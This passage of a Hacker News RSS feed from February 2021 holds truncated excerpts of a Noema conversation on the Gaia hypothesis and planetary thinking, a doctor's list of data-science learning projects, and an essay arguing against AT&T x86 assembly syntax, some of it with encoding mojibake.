<p>So, when Jim Lovelock and Lynn Margulis proposed the <span data-note="The Gaia hypothesis suggests that all living matter on Earth forms a synergistic complex system, likened to a single organism, regulating the conditions for life.">Gaia hypothesis</span> in the early 70s, CoEvolution Quarterly, which I was then editing, was one of the first places to print it and then print a debate about it. At the time, a lot of biologists were pretty skeptical, even hostile, to the Gaia hypothesis. A scientist up in Canada named W. Ford Doolittle wrote to me and said something like, ‚ÄúGaia is an intriguing idea and idealistic, but it makes no sense in terms of evolution, because if the Earth is supposedly adapting, what is it adapting in relation to? You can‚Äôt have a species of one individual. Fitness only makes sense in relation to other individuals. But with Gaia, there are no other individuals.‚Äù Doolittle and Lovelock went back and forth, and I printed that.</p>


<!-- Quote Block Template -->

<div>

  <div>

    <p>
      ‚ÄúOn the roof of my apartment in San Francisco, I had an LSD-laced vision where I asked myself, <br> ‚ÄòWhat am I going to do for humanity?‚Äô‚Äù    </p>

          
    
    
  </div>
</div>




<p>But here‚Äôs an update: Just last year, Doolittle published an <a href="https://aeon.co/essays/the-gaia-hypothesis-reimagined-by-one-of-its-key-sceptics" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">essay</a> saying, ‚ÄúYou know what, I think Lovelock and Margulis were right.‚Äù He revised his thinking about how evolution works to account for what you might call group selection, outside of the individual, to include whole arrays of things. His piece looked at ‚Äúnested arrays,‚Äù all the way up to the whole Earth as itself a nested array of various forces. One of the things he notices is an idea very much in line with the Long Now Foundation, which is the persistence of species and the persistence of individuals. In the same way, Bruno Latour and Timothy Lenton‚Äôs essay on <a href="https://science.sciencemag.org/content/361/6407/1066" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">Gaia 2.0</a> makes the point that some systems learn how to become good at persisting ‚Äî and the Earth is one of those.</p>



<p>What I see now is that human civilization is in the process of trying to become like Earth, in the sense of learning how to become a persistent system. In this century, we‚Äôre going to get a lot of harsh lessons on how not to persist ‚Äî and then we will either correct that, or we won‚Äôt.</p>



<p>My particular take on COVID-19 (besides dread) is that the best thing that COVID might do for us is give global civilization a chance to think in planetary-scale terms about a problem that, like climate change, is in a sense caused by all of us and can only be solved by a large quantity of us. There are examples of handling it well, like in Taiwan or New Zealand, and handling it badly, like here and in Italy. I see a chance in this century for civilization to get out of its adolescence, to become more mature, pragmatic, skeptical and solution-oriented (rather than story-oriented) so that we can reverse planetary degradation. This won‚Äôt be like ending the Cold War. This is a new kind of problem, where people have to really <em>connect </em>in order to fix it.</p>


<!-- Quote Block Template -->

<div>

  <div>

    <p>
      ‚ÄúThe whole Earth has been a frame that directed attention toward things we might otherwise not take seriously.‚Äù     </p>

          <p>‚ÄîBrand</p>
    
    
  </div>
</div>




<p>In the introduction to the Whole Earth Catalog in 1968, I wrote, ‚ÄúWe are as gods and might as well get good at it.‚Äù More recently, in ‚ÄúWhole Earth Discipline‚Äù (2009), I wrote, ‚ÄúWe are as gods and <em>have</em> to get good at it.‚Äù What changed between those two statements is global warming, which changed the sense of who the ‚Äúwe‚Äù is.</p>



<p>The ‚Äúwe‚Äù in the Whole Earth Catalog are the individuals who were empowered to leave college and go get their own education in more interesting, exciting, inventive and creative ways than just studying for a degree. (The idea was to go out and start communes, things like that. All of them failed: Hey, we all learn our lessons!)</p>



<p>By contrast, the ‚Äúwe‚Äù of climate change has almost nothing to do with individuals. It‚Äôs the ‚Äúwe‚Äù of civilization: Civilization now has powers, godlike powers (in the sense of Greek gods, not the Christian God ‚Äî we don‚Äôt have omniscience and never will).</p>


<!-- Quote Block Template -->

<div>

  <div>

    <p>
      ‚ÄúHuman civilization is in the process of trying to become like Earth, in the sense of learning how to become a persistent system.‚Äù     </p>

          <p>‚ÄîBrand</p>
    
    
  </div>
</div>




<p><strong>Brown: </strong>As I listen to Stewart, I‚Äôm reminded that one of the things that inclined me to focus was my training in the Jesuit seminary, where we were isolated in a small group to study large issues. The Jesuits call them the ‚Äúlast four things‚Äù: death, judgment, heaven, hell.</p>



<p>Now, I left all that behind for a number of reasons, not the least of which was skepticism, but what stayed with me was the hankering to relate to something really important. In today‚Äôs politics, I find that a lot of transient and trivial issues of the moment dominate the political imagination through the media, and in doing so, they diminish and marginalize these bigger issues we should be thinking about.</p>



<p>People say, wait, what about education funding? What about the property tax? But in relation to the larger, planetary issues, these seems like an evasion. An issue like climate change requires a different approach.</p>


<!-- Quote Block Template -->

<div>

  <div>

    <p>
      ‚ÄúA lot of transient and trivial issues of the moment diminish and marginalize these bigger issues we should be thinking about.‚Äù     </p>

          <p>‚ÄîBrown</p>
    
    
  </div>
</div>




<p><strong>Gilman: </strong>Governor Brown, given what you said earlier about the rootedness of people in belief rather than reason, how likely do you think it is that the public is going to be able to get there in terms of appreciating the complexity and seriousness of these planetary problems? Microbes and carbon molecules don‚Äôt care about borders. And in many ways, technological risk, like with nuclear weapons or artificial intelligence, doesn‚Äôt care about borders.</p>



<p>At the same time, however, the public and politicians still think in terms of narratives and have beliefs that in ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.noemamag.com/the-origins-of-planetary-realism-and-whole-earth-thinking/">https://www.noemamag.com/the-origins-of-planetary-realism-and-whole-earth-thinking/</a></em></p>]]>
            </description>
            <link>https://www.noemamag.com/the-origins-of-planetary-realism-and-whole-earth-thinking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123744</guid>
            <pubDate>Sat, 13 Feb 2021 14:24:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Create YouTube playlists without an account (savable as url)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26123256">thread link</a>) | @nevernothing
<br/>
February 13, 2021 | https://playlists.at/youtube/ | <a href="https://web.archive.org/web/*/https://playlists.at/youtube/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://playlists.at/youtube/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123256</guid>
            <pubDate>Sat, 13 Feb 2021 12:34:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Every project I did to become a data scientist (as a doctor)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26122974">thread link</a>) | @ChrisLovejoy
<br/>
February 13, 2021 | https://chrislovejoy.me/all-projects/ | <a href="https://web.archive.org/web/*/https://chrislovejoy.me/all-projects/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
            </figure>

            <section>
                <div>
                    <h2 id="learning-to-code-as-a-full-time-doctor-">Learning to code as a full-time doctor&nbsp;ü©∫</h2><p>At the start of 2018, I had recently graduated from medical school. I knew basic web development and not much more.</p><p>Since mid-2020, I've been working full-time as a data scientist, analysing Big Data with Spark, SQL and Python (for a company with $300 million annual revenue).</p><p>I built my skills alongside a full-time job as a doctor, by doing courses and projects in my free moments.</p><p>Here I'm going to share every course and project that took me from zero to a full-time technical role in just over 2 years.</p><h2 id="-what-s-the-use-of-a-project-list">üìã What's the use of a project&nbsp;list?</h2><p>This isn't a prescriptive list. Nor is it a 'how-to guide'.</p><p>Instead, I hope to:</p><ol><li><strong>Give inspiration for your own project ideas</strong></li><li><strong>Give insight into the journey of building data science + coding skills</strong></li></ol><p>I've shared project details, timelines and the rough amount of time spent on each. Of course, rate of progress depends on many factors (amount of time you can/want to put is key üîë). I did this alongside a fairly demanding full-time job, so obviously could have made faster progress. But it was high on my priority list outside of work, so it could also have been slower.</p><h2 id="-themes-i-noticed">üé° Themes I&nbsp;noticed</h2><p>Making this list helped me identify two themes:</p><ol><li><strong>I started with online courses but shifted to projects as soon as possible.</strong> (I'm a big believer that projects are where the real learning happens.)</li><li><strong>The projects got cooler and more complicated as time progressed.</strong> While each project builds your skills, it also helps you identify (i) what's possible and (ii) what's interesting.</li></ol><hr><h2 id="-the-journey-from-beginner-to-now">üõ£ THE JOURNEY: FROM BEGINNER TO&nbsp;NOW</h2><h3 id="-1-the-javascript-road-trips-1-2-and-3-codeacademy-course-">(1) The Javascript Road Trips 1, 2 and 3‚Ää‚Äî‚ÄäCodeAcademy [COURSE]</h3><ul><li><strong>Date Completed: </strong>Jan‚Ää‚Äî‚ÄäFeb 2018</li><li><strong>Time Committed: ~30 hours </strong>(roughly 2 evenings per week for 4-6 weeks)</li><li><strong>Link: </strong><a href="https://www.pluralsight.com/courses/code-school-javascript-road-trip-part-1" rel="noopener">Here</a> (now on Pluralsight).</li></ul><p>When starting off, I had no idea where to begin. I wasn‚Äôt even sure what coding language to learn.</p><p>So I googled something along the lines of ‚ÄúBest coding language to learn 2018‚Äù and Javascript and Python seemed the most consistent top answers.</p><p>I decided to start with Javascript, looked for a course online and found this one.</p><h4 id="main-takeaway-s-"><strong>Main takeaway(s):</strong></h4><ul><li><strong>It‚Äôs more import to start learning than to start learning the <em>‚Äúright‚Äù </em>language.</strong> In retrospect, I should have started with Python (I have used it <em>way</em> more since). But this course taught me so much about <em>object-oriented programming</em>, which is relevant for many languages, so absolutely wasn‚Äôt a waste of time.</li><li><strong>Projects help you learn and remember.</strong> Looking back, the main principles that I still remember from this course are those I applied to later projects. A lot of the knowledge slipped out my brain (‚Äúuse it or lose it‚Äù).</li></ul><hr><h3 id="-2-python-for-data-science-datacamp-course-">üêç (2) Python for Data Science‚Ää‚Äî‚ÄäDataCamp [COURSE]</h3><ul><li><strong>Date Completed: </strong>March 2018</li><li><strong>Time Committed: ~30 hours </strong>(roughly 2 evenings per week for 4‚Äì6 weeks)</li><li><strong>Link: </strong>Courses 1, 2 and 4 from <a href="https://www.datacamp.com/tracks/data-scientist-with-python" rel="noopener">this learning track</a>.</li></ul><p>This was a great course for introducing the basics of coding for data science; numpy, pandas and matplotlib, which I still use heavily to this day.</p><h4 id="main-takeaway-s--1">Main takeaway(s):</h4><ul><li><strong>When learning a new coding language or library, it‚Äôs important to build a reference of the functions you learn. </strong>I‚Äôve lost count of the number of times I forgot and re-remembered (via Google) how to index into pandas DataFrames. The moment you have somewhere to refer each time (whether that‚Äôs your own notes or a ‚ÄòCheatSheet‚Äô like <a href="https://pandas.pydata.org/Pandas_Cheat_Sheet.pdf" rel="noopener">this</a>), life gets a whole lot easier.</li></ul><hr><h3 id="-3-text-analysis-tools-project-"> üí¨ (3) Text Analysis Tools [PROJECT]</h3><ul><li><strong>Date Completed: </strong>April 2018</li><li><strong>Time Committed: ~20 hours </strong>(roughly 2 evenings per week for 4 weeks)</li><li><strong>Link: </strong>I shared what I can on GitHub <a href="https://github.com/chris-lovejoy/Text-Analysis-Tools" rel="noopener">here</a>.</li></ul><p>While working part-time at a health-tech start-up in south London, I had the idea to make tools for analysing text. The company provides home care and they had a lot of unstructured text reports from visits. </p><p>I wrote code to perform various basic functions such as (i) split long reports into individual sentences, (ii) to count frequency of words to understand common topics and (iii) to create a .txt file that could be used for a language model (a later project).</p><h4 id="main-takeaway-s--2">Main takeaway(s):</h4><ul><li><strong>Get started with projects as soon as possible (no matter how small or unimportant). </strong>Looking back, this was a really simple project that I could probably do now in less than 10 minutes. At the time, it took me much, much longer. But in the struggle of figuring out how to properly import a .csv file, define functions and execute loops, I learnt so much that I couldn‚Äôt have learnt in a course environment.</li></ul><hr><h3 id="-4-machine-learning-by-andrew-ng-coursera-course-">üñ• (4) Machine Learning by Andrew Ng‚Ää‚Äî‚ÄäCoursera [COURSE]</h3><ul><li><strong>Date Completed: </strong>April‚Ää‚Äî‚ÄäMay 2018</li><li><strong>Time Committed: ~40‚Äì50 hours </strong>(roughly 2 x 2¬Ω hour sessions per week for videos, plus 1 long session on the programming assignment for ~2 months)</li><li><strong>Link: </strong><a href="http://coursera.org/learn/machine-learning" rel="noopener">Here</a>.</li></ul><p>This is the course where so many MLers begin and a common first window into the world of MOOCs.</p><p>The course design is great; the video with text transcripts, regular check-in questions and useful quizzes and assignments at the end.</p><h4 id="main-takeaway-s--3">Main takeaway(s):</h4><ul><li><strong>If you want to get started with machine learning, commit to finishing this course.</strong> It won‚Äôt be a waste of time. If you hate it, machine learning may not be for you. (I struggled with some of the maths at times‚Ää‚Äî‚Ääpush through.)</li><li><strong>Doing programming assignments helps you understand the topics. </strong>They say you don‚Äôt truly understand something until you have taught it. I‚Äôd say until you have programmed it.</li><li><strong>There‚Äôs a lot of machine learning that this course doesn‚Äôt cover.</strong> No mention of tree-based approaches, graphical models, bayesian inference and lots more good-stuff.</li></ul><hr><h3 id="-5-deep-learning-by-andrew-ng-coursera-course-">ü™î (5) Deep Learning by Andrew Ng‚Ää‚Äî‚ÄäCoursera [COURSE]</h3><ul><li><strong>Date Completed: </strong>June‚Ää‚Äî‚ÄäJuly 2018</li><li><strong>Time Committed: ~15-20 hours </strong>(in free-moments‚Ää‚Äî‚Ääcommute, lunchtime, etc‚Ää‚Äî‚Ääfor around 2 months. Only watched videos, didn‚Äôt do coding exercises.)</li><li><strong>Link:</strong> <a href="https://www.coursera.org/specializations/deep-learning" rel="noopener">Here</a>.</li></ul><h4 id="main-takeaway-s--4">Main takeaway(s):</h4><ul><li><strong>Sometimes it‚Äôs more efficient to just watch the videos (and not do the programming assignments). </strong>It depends how much time you have and how deep you want to go. I learnt a lot with programming anything here.</li></ul><hr><ul><li><strong>Date Completed: </strong>Aug‚Ää‚Äî‚ÄäSept 2018</li><li><strong>Time Committed:</strong> <strong>~10 hours</strong> (roughly 2 x 2.5h sessions per week for ~2 weeks)</li><li><strong>Link: </strong><em>not able to share</em></li></ul><p>While undertaking a psychiatry placement in South London, I noticed that the team were finding it hard to track and maintain the different physical health monitoring requirements of different patients. Patients on a particular drug would need blood tests or physical examinations at a certain frequency, but this varied a lot between patients.</p><p>I found that the key patient details could be exported to a .CSV file which I could put into Excel to analyse. I still wasn‚Äôt overly confident with Python at this stage, so I opted to use combinations of some simple Excel algorithms to process the data and highlight the next action required.</p><p>After we implemented this system, we were able to improve the percentage receiving optimal monitoring from 22% to 71%.</p><figure><img src="https://chrislovejoy.me/content/images/2020/12/image.png"><figcaption><em>(Apologies for the blurry image! This is the only one I could find.)</em></figcaption></figure><h3 id="main-takeaway-s--5">Main takeaway(s):</h3><ul><li><strong>You don't always have to write complex code to make a difference. </strong>I didn't write a line of code, but this was the most impactful data science-type thing I'd done at that point. What problem in your work-place could you solve with what you currently know (or could learn)?</li></ul><hr><h3 id="-7-predicting-drug-response-using-epigenetics-project-">üíä (7) Predicting drug response using epigenetics [PROJECT]</h3><p>Date Completed: November 2018</p><p>Time Committed: ~14 hours (one full weekend‚Ää-‚Ääcreated at the Cambridge Cancer Genomics Hackathon)</p><p>The response to anti-cancer medication varies widely. Before starting treatment, it's often unclear who will respond well and who won't. Completing a course of ineffective drugs wastes valuable time and can cause side effects.</p><p>In a team of 5, we tried to build a tool that could predict who would respond based on epigenetic changes after initial administration of the drug. We build a proof-of-concept algorithm (and won an award at the Hackathon).</p><p>However, this can't be applied in the real-world yet because we simply don't have the data. It's not routine for epigenetic data to be collected before, during and after drug treatment. Hopefully in the future, though!</p><figure><img src="https://chrislovejoy.me/content/images/2020/12/image-1.png"></figure><p>Main takeaway(s):<strong>Hackathons are a great way to work on interesting problems and level-up skills.</strong> The technical mentors and other team members taught me so much, and I used sk-learn for the first time.</p><hr><h3 id="-8-a-language-model-based-on-carer-reports-project-">üìö (8) A language model based on carer reports [PROJECT]</h3><ul><li><strong>Date Completed: </strong>Dec 2018‚Ää‚Äî‚ÄäJan 2019</li><li><strong>Time Committed: ~10‚Äì15 hours </strong>(roughly 2 sessions per week for 4-6 weeks)</li><li><strong>Link: </strong>On my GitHub page <a href="https://github.com/chris-lovejoy/Carer-Report-Language-Model" rel="noopener">here</a><strong>.</strong></li></ul><p>This was a continuation of earlier work for the health-tech start-up I was working for (Project 3).</p><p>To better understand the contents of written carer reports, I decided to build a language model (which uses the examples you show to write ‚Äòfake‚Äô alternative reports). This was partly educational and partly to better understand the types of things coming up in the reports.</p><h4 id="main-takeaway-s--6">Main takeaway(s):</h4><ol><li><strong>Most of the battle is getting data into the right form.</strong> This was my first time making a language model and my first time using Keras. Almost all my time was spent figuring out how to process the data to feed it into the model. Almost no time was spent on coding the model itself (which Keras makes really easy</li></ol><hr><h3 id="-9-preventing-medication-mistakes-with-the-pill-detector-project-">üìã (9) Preventing medication mistakes with ‚ÄòThe Pill Detector‚Äô [PROJECT]</h3><ul><li><strong>Date Completed: </strong>Jan 2019</li><li><strong>Time Committed: ~20 hours </strong>(one full weekend, including nights‚Ää‚Äî‚Ääcoded at the Cambridge University Hackathon)</li><li><strong>Links: </strong><a href="https://github.com/chris-lovejoy/pill-it-up" rel="noopener">code on GitHub</a><strong> </strong>/ <a href="https://devpost.com/software/isthismypoison" rel="noopener">submission</a> / <a href="https://www.youtube.com/watch?v=xzgWN6i0qoA" rel="noopener">video presentation</a></li></ul><p>The idea behind this project was: People often make mistakes when taking their medication, such as confusing different pills. This is particularly a problem in the elderly.</p><p>We wanted to make a device to reduce this. We made a tool which takes a picture of a pill, classifies the medication and then checks against a patients‚Äô medical record to see if it‚Äôs right to take. We felt this could be a helpful ‚Äòlast minute check‚Äô before taking the pill itself.</p><h4 id="main-takeaway-s--7">Main takeaway(s):</h4><ul><li><strong>If your coding is not strong, you can still add value with ‚Ä¶</strong></li></ul></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chrislovejoy.me/all-projects/">https://chrislovejoy.me/all-projects/</a></em></p>]]>
            </description>
            <link>https://chrislovejoy.me/all-projects/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122974</guid>
            <pubDate>Sat, 13 Feb 2021 11:30:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why no one should use AT&T syntax ever, for any reason, under any circumstances]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26122532">thread link</a>) | @moonchild
<br/>
February 13, 2021 | https://elronnd.net/writ/2021-02-13_att-asm.html | <a href="https://web.archive.org/web/*/https://elronnd.net/writ/2021-02-13_att-asm.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<em>2021-02-13</em><br>

<h2 id="baggins">Background</h2>

<p>
In the beginning, the CPU was created.
This has made a lot of people very angry and has been widely regarded as a bad move.

</p><p>
Though computers have only gained in popularity, in our interactions with them we have increasingly attempted to interact less with the CPU; and more and more with the abstractions that simply <i>happen</i> to be implemented atop CPUs.
One of the earliest such abstractions was the <b>instruction set architecture</b> (ISA).
The idea was this: instead of writing code for a specific CPU, you would design an abstract specification for one; a language, if you will, that could be spoken by multiple different CPUs.
You would then write code according to that instruction set, in that language, and it could be interpreted by any CPU implementing that instruction set.
This was desirable partly because it allowed code to be written once and run multiple places√¢‚Ç¨‚Äùthe first inklings of portability, rising!√¢‚Ç¨‚Äùbut mostly because it allowed you to think only of the specification while you wrote your code, and perhaps even forget for a moment that there was a CPU underlying it all.

</p><p>Ahhh, the power of abstraction in the morning...

</p><p>
Another such abstraction was the <b>mnemonic assembler</b>.
Before the assembler was created, CPUs and ISAs were instructed using numbers which had special meaning to the ISA in question.
For example, consider the following number<sup id="b0"><a href="#f0">0</a></sup> (in octal form, for no particular reason):

</p><pre>030514</pre>

<p>
In the context of the ISA implemented by the CRAY-1<sup id="b1"><a href="#f1">1</a></sup>, that number is understand to mean √¢‚Ç¨Àúadd the contents of registers A1 and A4, and store the result in register A5√¢‚Ç¨‚Ñ¢.
The association between this numeric form and its meaning under the ISA is completely arbitrary, and serves only to remind our poor programmers that they are serving a CPU, whose native language is written with arbitrary numbers.
Wouldn√¢‚Ç¨‚Ñ¢t it be nice if, instead of meaningless <span>030514</span>, our CPU could understand a form like this one?

</p><pre>A5	A1+A4
</pre>

<p>
(This latter form, while no less arbitrary than the other, is arbitrary in a way which matches preexisting human arbitrarinesses.
 This makes humans feel warm and fuzzy inside, like they√¢‚Ç¨‚Ñ¢ve conquered a part of the machine kingdom with their superior human intellect, and is called a √¢‚Ç¨Àúmnemonic√¢‚Ç¨‚Ñ¢.)

</p><p>
Unfortunately, while CPUs are equally capable of parsing numbers like <span>030514</span> and strings of words like <span>A5	A1+A4</span>, they are much slower at the second.
Thus, a compromise was borne: a mnemonic assembler would be a program (like all programs, it would run on a CPU implementing an ISA), and it would translate mnemonic forms like <span>A5	A1+A4</span> into machine forms like <span>030514</span>.
This allows humans to <i>pretend</i> that the CPUs understand their own native language, while still allowing the CPUs themselves to run at tolerable speeds.

</p><p>
At this point, it is worth making a couple of things devastatingly clear.

</p><p>
First, an assembler that runs on a given ISA may produce machine code for that ISA, or machine code for a completely different ISA.<!--(An assembler that produces code for a different ISA than that on which is runs is sometimes called a √¢‚Ç¨Àúcross assembler√¢‚Ç¨‚Ñ¢, √É¬† la √¢‚Ç¨Àúcross compiler√¢‚Ç¨‚Ñ¢.)-->
</p><p>
Second, there is almost always a 1:1 correspondence between the mnemonics inhaled by a given assembler and the instructions it spits out.  (Where there is not, the situation is generally close enough to 1:1 as to make no ends.)
</p><p>
Third, mnemonics were not standardised the same way that ISAs were.  A given set of mnemonics only works on one ISA, but there might be any number of other mnemonic-sets that also work on that ISA.  (Despite this, a number of tropes tend emerge which are shared by all mnemonic-sets targeting a given ISA.)

</p><p>
At this point, we are ready to attack the problem at hand.
</p><p>
There is a popular group of ISAs variably known as:
</p><ul>
<li>x86
 <ul><li>x86-64?
  <ul><li>EM64T?
   <ul><li>x64??
    <ul><li>AMD64???</li>
    </ul></li>
   </ul></li>
  </ul></li>
 </ul></li>
<li>IA-32
 <ul><li>IA-32<b>e</b>???</li></ul></li>
</ul>
(The question marks have been added for comedic effect.
 In point of fact, they are about as funny as the overproliferation of names that this ISA seems to accumulate in much the same way that a pile of cow dung accumulates flies or that this sentence accumulates words.
 Unlike a pile of cow dung, however, no clarity emerges when you swat it; only more confusion.
 Which being said, you should still clean your CPU at least annually; use soap, warm water, and a soft rag to get the gunk out of the transistors.)

<p>
This ill-fated ISA, which has almost as many addressing forms as names and is so immensely complicated that a you need to read a 5000-page tome<sup id="b2"><a href="#f2">2</a></sup> plus an additional 400 or so pages of unofficial reference before you can even begin to be qualified to understand the consequences of a single of its instructions, will henceforth be referred to as √¢‚Ç¨Àú√¢‚Ç¨≈ìSIB√¢‚Ç¨ÔøΩ√¢‚Ç¨‚Ñ¢.
I give it that name not so much to deliberately sow confusion (though that is definitely a contributing factor) as because that√¢‚Ç¨‚Ñ¢s the only name that everybody seems to agree is associated with it.
(This is also the reason its name is quoted: it√¢‚Ç¨‚Ñ¢s the only word, indeed the only idea in this missive I didn√¢‚Ç¨‚Ñ¢t make up from whole cloth, ripped cloth, cheese cloth, pins, pinheads, camembert<sup id="b3"><a href="#f3">3</a></sup>, angels, and heads of √£ÔøΩ¬Æ√£ÔøΩ¬£√£ÔøΩ¬∫√£‚Äö‚Ä∞√£ÔøΩ¬º√£ÔøΩ‚Ä†.)

</p><p>
Because √¢‚Ç¨ÀúSIB√¢‚Ç¨‚Ñ¢ is, inexplicably, enduringly popular, a lot of assemblers have been made for it.
As I mentioned, though different assemblers are not always compatible with each other, tropes and commonalities tend to emerge.
In fact, there are two incompatible sets of tropes; they are generally called √¢‚Ç¨ÀúAT&amp;T syntax√¢‚Ç¨‚Ñ¢ and √¢‚Ç¨ÀúIntel syntax√¢‚Ç¨‚Ñ¢, and you can read about the differences <a href="https://en.wikipedia.org/wiki/X86_assembly_language#Syntax">here</a>.

</p><p>
...but you knew all of this already.
If I√¢‚Ç¨‚Ñ¢ve done my due diligence, you were incited by the title but are still looking for something to disagree (or agree) with strongly.
Patience!

</p><p>
I contend that the AT&amp;T syntax is harmful and bad, and should never be used, for any reason, under any circumstances, by anyone.
Here√¢‚Ç¨‚Ñ¢s why:


</p><h2 id="the-real-biggy">AT&amp;T syntax is broken</h2>

<p>
This is the single greatest sin perpetrated by the AT&amp;T syntax.
If not for this, it would be sufficient to say that Intel syntax were superior.
If not for this, the use of AT&amp;T syntax would be at least be acceptable, at least be moral<sup id="b4"><a href="#f4">4</a></sup>, even if still in supremely poor taste.
If not for this, it would be <i>possible</i> to write correct programs using the AT&amp;T syntax.

</p><p>
Now, to be clear, I don√¢‚Ç¨‚Ñ¢t expect advanced safety features from an assembler.
I don√¢‚Ç¨‚Ñ¢t expect dependent types, or linear types, or even any types at all.
<i>But I would pretty damn well appreciate it if my assembler didn√¢‚Ç¨‚Ñ¢t <b>actively</b> try to sabotage me!</i>


</p><p>
Let me show you an example.
Here√¢‚Ç¨‚Ñ¢s an annotated snippet of Intel-style √¢‚Ç¨ÀúSIB√¢‚Ç¨‚Ñ¢ assembly:

</p><pre>mov	eax, 28            ; (1) store the immediate value 28 in the EAX register
mov	eax, dword [28]    ; (2) load one √¢‚Ç¨Àúdword√¢‚Ç¨‚Ñ¢ (4 bytes) from memory location 28 and store it in the EAX register <!--;     (on some assemblers, √¢‚Ç¨Àúdword√¢‚Ç¨‚Ñ¢ should be replaced with √¢‚Ç¨Àúdword ptr√¢‚Ç¨‚Ñ¢, or just elided entirely)-->
</pre>

<p>
Here√¢‚Ç¨‚Ñ¢s another snippet, AT&amp;T syntax this time:

</p><pre>movl	$28, %eax          ; (1) store the immediate value 28 in the EAX register
movl	(28), %eax         ; (2) load one √¢‚Ç¨Àú(l)ong√¢‚Ç¨‚Ñ¢ (4 bytes) from memory location 28 and store it in the EAX register <!--;     (on some assemblers, the √¢‚Ç¨Àúl√¢‚Ç¨‚Ñ¢ can be elided)-->
</pre>

<p>
Good so far?
Reasonable?
Good.

</p><p>
I present to you two more candidates, again in AT&amp;T syntax:

</p><pre>movl	28, %eax           ; (3) ???
movl	($28), %eax        ; (4) ???
</pre>

<p>
Before you continue reading, I want you to imagine what it would make <i>sense</i> for those instructions to mean.
Should they even be correct?
If you happen to already know, try to forget (pray for oblivion from the horror...)

</p><p>
If you don√¢‚Ç¨‚Ñ¢t know, make your best guess.

</p><p>
Ready?
Here they are again, with annotations this time:

</p><pre>movl	28, %eax           ; (3) same as (2)
movl	($28), %eax        ; (4) load one long from the memory location indicated by global symbol √¢‚Ç¨Àú$28√¢‚Ç¨‚Ñ¢ and store it in the EAX register
</pre>

<p>
Wait, what?

</p><p>
Go back and read that again and tell me in what world that could possibly be okay.
Tell me in what world an assembler that silently accepts the above forms, that is almost certainly corrupting your meaning in a way you don√¢‚Ç¨‚Ñ¢t intend, could <i>possibly</i> produce correct code.
Tell me you would <i>never</i> forget to put a <span>$</span> in front of an immediate, and that you would never accidentally put one in a displacement.

</p><p>
This doesn√¢‚Ç¨‚Ñ¢t even have anything to do with Intel syntax.
This isn√¢‚Ç¨‚Ñ¢t a win for Intel over AT&amp;T.
This is just AT&amp;T syntax being straight-up batshit fucking bonkers for no very good reason.

</p><p>
All it would take to redeem AT&amp;T syntax√¢‚Ç¨‚Äùokay, maybe not redeem, but at least elevate from <i>Cocytus</i> to <i>Phlegyas</i>√¢‚Ç¨‚Äùwould be to make syntaxes (3) and (4) illegal.
That√¢‚Ç¨‚Ñ¢s it.
Want to help?
Send a patch to your local AT&amp;T-style assembler to make it warn for both of those forms.
Give it a command-line flag to err instead of warning.


</p><h2>AT&amp;T is backwards</h2>

<p>
Having eaten the proverbial elephant, it is time to start addressing the smaller fry.<br>
Smaller fry: you have done an admirable job of being a thorn in my side.<br>
Reader: following are reasons why the AT&amp;T operand order is backwards.

</p><p>
I√¢‚Ç¨‚Ñ¢m sure you√¢‚Ç¨‚Ñ¢re familiar with the issue, but here√¢‚Ç¨‚Ñ¢s a quick refresher.
Intel first:

</p><pre>mov	eax, ebx           ; (1) load one dword from the EBX register and store it in the EAX register
add	eax, ebx           ; (2) load a dword each from the EAX and EBX registers, add them together, and store the result (truncated to a dword) in the EAX register
</pre>

<p>
AT&amp;T:

</p><pre>mov	%ebx, %eax         ; (1) load one dword from the EBX register and store it in the EAX register
add	%ebx, %eax         ; (2) load a dword each from the EAX and EBX registers, add them together, and store the result (truncated to a dword) in the EAX register
</pre>

<p>
In general, Intel instruction mnemonics take the form √¢‚Ç¨Àú&lt;op&gt; &lt;destination&gt;, &lt;source&gt;√¢‚Ç¨‚Ñ¢, where AT&amp;T uses √¢‚Ç¨Àú&lt;op&gt; &lt;source&gt;, &lt;destination&gt;√¢‚Ç¨‚Ñ¢.

</p><p>
Before continuing, I want to establish a couple of things.

</p><p>
First, the consistency argument is bunk.
The consistency argument in favour of Intel syntax is illustrated by the following example:

</p><blockquote>Putting the destination first is more consistent with other, higher-level languages like C.
<span>mov eax, ebx</span> is analogous to <span>eax = ebc</span>, and <span>add eax, ebx</span> to <span>eax += ebx</span>; in general, <span>op x, y</span> is analogous to <span>x op= y</span>.</blockquote>
This is ‚Ä¶</div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://elronnd.net/writ/2021-02-13_att-asm.html">https://elronnd.net/writ/2021-02-13_att-asm.html</a></em></p>]]>
            </description>
            <link>https://elronnd.net/writ/2021-02-13_att-asm.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122532</guid>
            <pubDate>Sat, 13 Feb 2021 09:38:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner‚Äôs Guide to Getting Started with Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 83 (<a href="https://news.ycombinator.com/item?id=26122394">thread link</a>) | @onerom
<br/>
February 13, 2021 | https://serhack.me/articles/getting-started-with-bitcoin/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/getting-started-with-bitcoin/">archive.org</a>
